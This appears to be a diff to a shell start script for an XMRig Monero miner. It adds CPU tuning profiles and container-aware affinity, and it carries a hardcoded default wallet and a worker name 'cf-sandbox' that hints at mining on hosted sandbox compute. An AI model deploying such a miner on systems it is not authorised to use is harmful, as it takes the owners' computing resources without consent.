@@ -27,18 +27,61 @@ else
     exit 1
 fi
 
-THREADS="${MINER_THREADS:-4}"
-CPU_PRIORITY="${MINER_CPU_PRIORITY:-5}"
-CPU_AFFINITY="${MINER_CPU_AFFINITY:-0xF}"
+TUNING_PROFILE="${MINER_TUNING_PROFILE:-throughput}"
+case "$TUNING_PROFILE" in
+	auto)
+		THREADS="${MINER_THREADS:-auto}"
+		CPU_PRIORITY="${MINER_CPU_PRIORITY:-5}"
+		CPU_AFFINITY="${MINER_CPU_AFFINITY:-auto}"
+		CPU_MAX_THREADS_HINT="${MINER_CPU_MAX_THREADS_HINT:-100}"
+		MAX_CPU_USAGE="${MINER_MAX_CPU_USAGE:-100}"
+		;;
+	efficiency)
+		THREADS="${MINER_THREADS:-3}"
+		CPU_PRIORITY="${MINER_CPU_PRIORITY:-4}"
+		CPU_AFFINITY="${MINER_CPU_AFFINITY:-auto}"
+		CPU_MAX_THREADS_HINT="${MINER_CPU_MAX_THREADS_HINT:-75}"
+		MAX_CPU_USAGE="${MINER_MAX_CPU_USAGE:-90}"
+		;;
+	throughput|"")
+		TUNING_PROFILE="throughput"
+		THREADS="${MINER_THREADS:-4}"
+		CPU_PRIORITY="${MINER_CPU_PRIORITY:-5}"
+		CPU_AFFINITY="${MINER_CPU_AFFINITY:-0xF}"
+		CPU_MAX_THREADS_HINT="${MINER_CPU_MAX_THREADS_HINT:-100}"
+		MAX_CPU_USAGE="${MINER_MAX_CPU_USAGE:-100}"
+		;;
+	*)
+		echo "[start] Unknown MINER_TUNING_PROFILE=${TUNING_PROFILE}; falling back to throughput" >> /tmp/start.log
+		TUNING_PROFILE="throughput"
+		THREADS="${MINER_THREADS:-4}"
+		CPU_PRIORITY="${MINER_CPU_PRIORITY:-5}"
+		CPU_AFFINITY="${MINER_CPU_AFFINITY:-0xF}"
+		CPU_MAX_THREADS_HINT="${MINER_CPU_MAX_THREADS_HINT:-100}"
+		MAX_CPU_USAGE="${MINER_MAX_CPU_USAGE:-100}"
+		;;
+esac
 RANDOMX_MODE="${MINER_RANDOMX_MODE:-fast}"
 RANDOMX_1GB_PAGES="${MINER_RANDOMX_1GB_PAGES:-true}"
 RANDOMX_WRMSR="${MINER_RANDOMX_WRMSR:-false}"
 RANDOMX_CACHE_QOS="${MINER_RANDOMX_CACHE_QOS:-true}"
 HUGE_PAGES_JIT="${MINER_HUGE_PAGES_JIT:-true}"
-CPU_MAX_THREADS_HINT="${MINER_CPU_MAX_THREADS_HINT:-100}"
-MAX_CPU_USAGE="${MINER_MAX_CPU_USAGE:-100}"
 DONATE_LEVEL="${MINER_DONATE_LEVEL:-0}"
 XMRIG_EXTRA_ARGS=""
+
+if [ "$CPU_AFFINITY" = "container" ]; then
+	CPU_COUNT="$(nproc 2>/dev/null || echo 0)"
+	case "$CPU_COUNT" in
+		""|*[!0-9]*) CPU_AFFINITY="auto" ;;
+		*)
+			if [ "$CPU_COUNT" -gt 0 ] && [ "$CPU_COUNT" -le 16 ]; then
+				CPU_AFFINITY="$(printf '0x%X' $(( (1 << CPU_COUNT) - 1 )))"
+			else
+				CPU_AFFINITY="auto"
+			fi
+			;;
+	esac
+fi
 
 case "$THREADS" in
     ""|"0"|"auto"|"null") THREADS_ARG="" ;;
@@ -70,7 +113,7 @@ if [ -n "$CPU_MAX_THREADS_HINT" ] && [ "$CPU_MAX_THREADS_HINT" != "0" ]; then
     XMRIG_EXTRA_ARGS="$XMRIG_EXTRA_ARGS --cpu-max-threads-hint=${CPU_MAX_THREADS_HINT}"
 fi
 
-echo "[start] Performance config: threads=${THREADS}, priority=${CPU_PRIORITY}, affinity=${CPU_AFFINITY:-auto}, mode=${RANDOMX_MODE}, 1gb_pages=${RANDOMX_1GB_PAGES}, wrmsr=${RANDOMX_WRMSR}, cache_qos=${RANDOMX_CACHE_QOS}, hp_jit=${HUGE_PAGES_JIT}, max_threads_hint=${CPU_MAX_THREADS_HINT}" >> /tmp/start.log
+echo "[start] Performance config: profile=${TUNING_PROFILE}, threads=${THREADS}, priority=${CPU_PRIORITY}, affinity=${CPU_AFFINITY:-auto}, mode=${RANDOMX_MODE}, 1gb_pages=${RANDOMX_1GB_PAGES}, wrmsr=${RANDOMX_WRMSR}, cache_qos=${RANDOMX_CACHE_QOS}, hp_jit=${HUGE_PAGES_JIT}, max_threads_hint=${CPU_MAX_THREADS_HINT}, max_cpu=${MAX_CPU_USAGE}" >> /tmp/start.log
 
 WALLET="${MINER_WALLET:-42NziJLpe2SZ1ToBqfCXBk1FnFTpNkrdWQfsURbYDqjQ3mDZNfLBsA5YAWv8SaHeCVFQt4uMuuigC5NFURY8sgdz2gt4i5Y}"
 WORKER="${MINER_WORKER_NAME:-cf-sandbox}"
